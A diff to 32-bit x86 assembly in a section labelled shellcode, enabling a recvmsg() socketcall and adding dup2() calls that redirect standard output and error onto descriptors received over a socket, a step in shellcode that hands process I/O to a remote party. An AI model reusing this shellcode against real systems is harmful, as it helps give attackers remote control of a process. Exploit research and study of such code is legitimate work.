@@ -43,18 +43,45 @@ shellcode:
         jl      erroutclose
 
         # recvmsg()
-        #movl    22(%ebp), %eax  # copy socket fd
-        #movl    %eax, 144(%ebp)
-        #movl    $102, %eax      # socketcall()
-        #movl    $17, %ebx       # recvmsg()
-        #movl    %ebp, %ecx      # socket struct
-        #addl    $144, %ecx
-        #int     $0x80
-        #movl    $40, %ebx       # step 40 - recvmsg
-        #cmpl    $0, %eax
-        #jmp     errout
-        #jl      errout
+        movl    24(%ebp), %eax  # copy socket fd
+        movl    %eax, 144(%ebp)
+        movl    $102, %eax      # socketcall()
+        movl    $17, %ebx       # recvmsg()
+        movl    %ebp, %ecx      # socket struct
+        addl    $144, %ecx
+        int     $0x80
+        movl    $40, %ebx       # step 40 - recvmsg
+        cmpl    $1, %eax
+        jne      errout
 
+        # dup2(n, 0)
+        #movl    $63, %eax
+        #movl    208(%ebp), %ebx
+        #movl    $0, %ecx
+        #int     $0x80
+        #movl    $30, %ebx       # step 50 - dup2(n, 0)
+        #cmpl    $0, %eax
+        #jl      erroutclose
+
+        # dup2(n, 1)
+        movl    $63, %eax
+        movl    212(%ebp), %ebx
+        movl    $1, %ecx
+        int     $0x80
+        movl    $30, %ebx       # step 60 - dup2(n, 1)
+        cmpl    $0, %eax
+        jl      erroutclose
+
+        # dup2(n, 2)
+        movl    $63, %eax
+        movl    216(%ebp), %ebx
+        movl    $2, %ecx
+        int     $0x80
+        movl    $30, %ebx       # step 70 - dup2(n, 2)
+        cmpl    $0, %eax
+        jl      erroutclose
+        
+        movl    $255, %ebx
         # all done
         jmp     okout
 
